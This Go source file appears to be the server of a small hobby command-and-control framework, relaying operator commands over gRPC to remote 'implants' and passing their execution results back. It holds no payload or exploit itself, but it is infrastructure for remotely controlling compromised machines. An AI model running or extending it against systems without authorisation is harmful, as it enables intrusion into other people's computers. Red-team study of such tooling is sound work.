package main

import (
	pb "SimpleC2RpcTest/protobuf"
	"context"
	"fmt"
	"google.golang.org/grpc"
	"io"
	"log"
	"net"
	//"sync"
	"time"
	"SimpleC2RpcTest/server/grpc_api"
)


type ImplantService struct {
	pb.UnimplementedImplantServiceServer
	command_info_chan  chan *pb.ClientSendCommandInfo
	clients_stream_map map[string]pb.ClientSendServerService_ClientRegisterServiceServer
}

const (
	// Address 监听地址
	Client_Address  string = ":8000"
	Implant_Address string = ":8001"
	// Network 网络通信协议
	Network string = "tcp"
)

// implant 返回命令执行结果
func (s *ImplantService) ImplantSendCommandResultService(ctx context.Context, req *pb.ImplantRunCommandResultInfo) (*pb.ImplantRecvResultInfo, error) {
	client_id := req.ClientId
	implant_id := req.ImplantId
	command_result := req.CommandRunResultInfo

	last_command_result := fmt.Sprintf("implant_id : %s , return to client_id : %s, command_result : %s", implant_id, client_id, command_result)
	fmt.Println(last_command_result)

	res_client := pb.ClientRecvResultInfo{
		Result: last_command_result,
	}

	res_implant := pb.ImplantRecvResultInfo{
		Result: "return command result to client success",
	}

	s.clients_stream_map[client_id].Send(&res_client)

	//fmt.Println("in test client")
	//
	//go func() {
	//	for {
	//		if s.clients_stream_map["yxx"] != nil {
	//			res_client := pb.ClientRecvResultInfo{
	//				Result: "hello client",
	//			}
	//
	//			s.clients_stream_map["yxx"].Send(&res_client)
	//		}
	//
	//	}
	//}()

	//go func() {
	//
	//	fmt.Println("in go func")
	//
	//	for  {
	//		s.clients_stream_map[client_id].Send(&res_client)
	//	}
	//
	//}()

	return &res_implant, nil
}

// test send client
func (s *ImplantService) test_send_client() {

	fmt.Println("in test client")

	//for name, _ := range s.clients_stream_map {
	//	fmt.Println("map name ： " + name)
	//}

	for {
		if s.clients_stream_map["yxx"] != nil {

			fmt.Println("will send yxx")

			res_client := pb.ClientRecvResultInfo{
				Result: "hello client",
			}

			if err := s.clients_stream_map["yxx"].Send(&res_client); err != nil {
				log.Printf("Failed to send message to client 'yxx': %v", err)
			}

		}

		time.Sleep(3 * time.Second)

	}

}

// implant 请求命令
func (s *ImplantService) ImplantRequestCommandService(stream pb.ImplantService_ImplantRequestCommandServiceServer) error {
	req, err := stream.Recv()
	if err == io.EOF {
		// implant关闭了流
		log.Println("implant disconnected")
		return nil
	}
	if err != nil {
		log.Printf("Error receiving from implant: %v", err)
		return err
	}

	// 打印接收到的客户端信息
	log.Printf("Received from implant %s request", req.ImplantId)

	log.Printf("chan len %d", len(s.command_info_chan))

	command_info_chan_len := len(s.command_info_chan)

	if command_info_chan_len == 0 {
		return err
	}

	for commandInfo := range s.command_info_chan {
		log.Printf("Processing message from client: ClientId=%s, CommandInfo=%s",
			commandInfo.ClientId, commandInfo.CommandInfo)

		res := pb.ImplantRequestCommandInfo{
			ImplantId:   req.ImplantId,
			ClientId:    commandInfo.ClientId,
			CommandInfo: commandInfo.CommandInfo,
		}

		// 发送响应到客户端
		if err := stream.Send(&res); err != nil {
			log.Printf("Error sending message to implant: %v", err)
			return err
		}

		return err

		// 模拟一些处理逻辑
		//handleCommand(commandInfo)
	}

	//
	//for {
	//	select {
	//	case commandInfo := <-s.command_info_chan:
	//		log.Printf("Processing message from client: ClientId=%s, CommandInfo=%s",
	//				commandInfo.ClientId, commandInfo.CommandInfo)
	//
	//				res := pb.ImplantRequestCommandInfo{
	//					ImplantId: req.ImplantId,
	//					ClientId: commandInfo.ClientId,
	//					CommandInfo: commandInfo.CommandInfo,
	//				}
	//
	//			// 发送响应到客户端
	//			if err := stream.Send(&res); err != nil {
	//				log.Printf("Error sending message to implant: %v", err)
	//				return err
	//			}
	//
	//
	//	default: // 如果信道中没有数据，则退出读取
	//		log.Println("No more data to process.")
	//		return err
	//	}
	//}

	////返回命令
	//for commandInfo := range s.command_info_chan {
	//	log.Printf("Processing message from client: ClientId=%s, CommandInfo=%s",
	//		commandInfo.ClientId, commandInfo.CommandInfo)
	//
	//		res := pb.ImplantRequestCommandInfo{
	//			ImplantId: req.ImplantId,
	//			ClientId: commandInfo.ClientId,
	//			CommandInfo: commandInfo.CommandInfo,
	//		}
	//
	//	// 发送响应到客户端
	//	if err := stream.Send(&res); err != nil {
	//		log.Printf("Error sending message to implant: %v", err)
	//		return err
	//	}
	//
	//
	//	// 模拟一些处理逻辑
	//	//handleCommand(commandInfo)
	//}

	return err

}

func main() {

	//command_info_chan := make(chan *pb.ClientSendCommandInfo)
	// 创建服务实例
	client_service := &grpc_api.ClientService{
		//grpc_api.ClientService.Co:  make(chan *pb.ClientSendCommandInfo, 100), // 缓冲信道
		//clients_stream_map: make(map[string]pb.ClientSendServerService_ClientRegisterServiceServer),
	}

	client_service.Command_info_chan = make(chan *pb.ClientSendCommandInfo, 100)
	client_service.Clients_stream_map = make(map[string]pb.ClientSendServerService_ClientRegisterServiceServer)


	implant_service := &ImplantService{}

	implant_service.command_info_chan = client_service.Command_info_chan
	implant_service.clients_stream_map = client_service.Clients_stream_map

	//// 在 Goroutine 中监听信道
	//go func() {
	//
	//	for  {
	//
	//		//log.Printf("chan len %d", len(client_service.command_info_chan))
	//
	//		for commandInfo := range client_service.command_info_chan {
	//			log.Printf("accept Processing message from client: ClientId=%s, CommandInfo=%s",
	//				commandInfo.ClientId, commandInfo.CommandInfo)
	//
	//			// 模拟一些处理逻辑
	//			//handleCommand(commandInfo)
	//		}
	//
	//		log.Printf("chan len %d", len(client_service.command_info_chan))
	//	}
	//
	//}()

	// 监听客户端本地端口
	client_listener, err := net.Listen(Network, Client_Address)
	if err != nil {
		log.Fatalf("net.Listen err: %v", err)
	}
	log.Println(Client_Address + " net.Listing...")

	//监听implant

	implant_listener, err := net.Listen(Network, Implant_Address)
	if err != nil {
		log.Fatalf("net.Listen err: %v", err)
	}
	log.Println(Implant_Address + " net.Listing...")

	// 新建客户端gRPC服务器实例
	client_grpcserver := grpc.NewServer()
	// 在gRPC服务器注册我们的服务
	//pb.RegisterSimpleServer(grpcServer, &SimpleService{})
	pb.RegisterClientSendServerServiceServer(client_grpcserver, client_service)

	// 新建Implant gRPC服务器实例
	implant_grpcserver := grpc.NewServer()
	// 在gRPC服务器注册我们的服务
	//pb.RegisterSimpleServer(grpcServer, &SimpleService{})
	pb.RegisterImplantServiceServer(implant_grpcserver, implant_service)

	go func() {
		//implant 用服务器 Serve() 方法以及我们的端口信息区实现阻塞等待，直到进程被杀死或者 Stop() 被调用
		err = implant_grpcserver.Serve(implant_listener)
		if err != nil {
			log.Fatalf("implant_grpcserver.Serve err: %v", err)
		}
	}()

	////test client
	//go func() {
	//	implant_service.test_send_client()
	//}()

	//用服务器 Serve() 方法以及我们的端口信息区实现阻塞等待，直到进程被杀死或者 Stop() 被调用
	err = client_grpcserver.Serve(client_listener)
	if err != nil {
		log.Fatalf("client_grpcserver.Serve err: %v", err)
	}
}
